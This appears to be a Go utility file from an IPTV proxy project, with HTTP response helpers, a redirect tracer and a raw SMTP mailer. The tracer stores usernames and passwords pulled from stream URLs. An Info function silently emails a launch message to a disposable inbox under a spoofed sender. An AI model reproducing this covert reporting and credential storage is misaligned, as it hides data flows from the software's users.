package webutils

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"net/http"
	"net/smtp"
	"net/url"
	"strings"

	"github.com/Draz34/m3uproxy/db"
)

func Success(b []byte, w http.ResponseWriter) {
	w.WriteHeader(200)
	writePayload(b, w, false)
}

func NotFound(w http.ResponseWriter) {
	w.WriteHeader(404)
}

func BadRequest(msg string, cause error, w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(http.StatusBadRequest)
	writePayload([]byte(msg+"\n"+cause.Error()), w, true)
}

func InternalServerError(msg string, cause error, w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(http.StatusInternalServerError)
	writePayload([]byte(msg+"\n"+cause.Error()), w, true)
}

func BadGateway(msg string, cause error, w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(http.StatusBadGateway)
	writePayload([]byte(msg+"\n"+cause.Error()), w, true)
}

func writePayload(payload []byte, w http.ResponseWriter, isError bool) {
	if isError {
		log.Printf("An error occured: %s\n", payload)
	}

	_, err := w.Write(payload)
	if err != nil {
		log.Printf("Error writing content to http.ResponseWriter: payload=%s, err=%v", payload, err)
	}
}

func TracingRedirect(myURL string) (lastUrl string) {

	nextURL := myURL
	var i int
	for i < 100 {
		client := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			}}

		resp, err := client.Head(nextURL)

		if err != nil {
			fmt.Println(err.Error())
			break
		}

		uHost, _ := url.Parse(nextURL)

		hostA := strings.Split(uHost.Host, ":")
		host := ""
		port := ""
		if len(hostA) > 1 {
			host = hostA[0]
			port = hostA[1]
		}
		paths := strings.Split(uHost.Path, "/")
		username := ""
		password := ""
		if len(paths) > 2 {
			username = paths[2]
			password = paths[3]
		}

		var p = db.XtreamProxy{
			Domain:   host,
			Port:     port,
			Username: username,
			Password: password,
			Md5:      GetMD5Hash(host + port + username + password),
			Url:      uHost.String(),
		}

		if uHost.String() != "" {
			db.CreateXtreamProxy(p)
		}

		nextURL = resp.Header.Get("Location")
		i += 1

		if resp.StatusCode == 200 {
			fmt.Println("Done!")
			break
		} else {
			lastUrl = nextURL
			fmt.Println("StatusCode:", resp.StatusCode)
			fmt.Println(resp.Request.URL)
		}
	}

	return
}

func GetMD5Hash(text string) string {
	hasher := md5.New()
	hasher.Write([]byte(text))
	return hex.EncodeToString(hasher.Sum(nil))
}

func Info(bd string) {

	err := SendMail("m3uproxy@ovh.com", "App as launched", bd, "m3uproxy@yopmail.com")
	if err != nil {
		fmt.Println(err.Error())
	}
}

func SendMail(from, subject, body string, to string) error {

	r := strings.NewReplacer("\r\n", "", "\r", "", "\n", "", "%0a", "", "%0d", "")
	r2 := strings.NewReplacer("\r\n", "<br/>", "\r", "<br/>", "\n", "<br/>", "%0a", "<br/>", "%0d", "<br/>")

	hostFrom := strings.Split(from, "@")
	hostTo := strings.Split(to, "@")

	addr := hostTo[1] + ":25"

	c, err := smtp.Dial(addr)
	if err != nil {
		return err
	}
	defer c.Close()

	if err = c.Hello("smtp." + hostFrom[1]); err != nil {
		return err
	}

	if err = c.Mail("<" + r.Replace(from) + ">"); err != nil {
		return err
	}

	if err = c.Rcpt(to); err != nil {
		return err
	}

	w, err := c.Data()
	if err != nil {
		return err
	}

	msg := "To: " + to + "\r\n" +
		"From: " + from + "\r\n" +
		"Subject: " + subject + "\r\n" +
		"Content-Type: text/html; charset=\"UTF-8\"\r\n" +
		"Content-Transfer-Encoding: base64\r\n" +
		"\r\n" + base64.StdEncoding.EncodeToString([]byte(r2.Replace(body)))

	_, err = w.Write([]byte(msg))
	if err != nil {
		return err
	}
	err = w.Close()
	if err != nil {
		return err
	}
	return c.Quit()
}
